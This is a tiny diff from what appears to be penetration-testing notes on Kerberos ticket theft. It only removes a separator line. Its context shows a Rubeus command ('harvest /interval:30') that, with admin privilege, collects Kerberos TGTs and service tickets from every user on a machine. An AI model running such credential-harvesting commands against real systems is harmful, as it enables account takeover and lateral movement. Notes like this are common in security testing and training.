@@ -9,8 +9,6 @@ Admin privilege: get all TGTs and TGs from all users on system
 Requirements:
 * Access to a machine
 
----
-
 `Rubeus.exe harvest /interval:30`
 
 
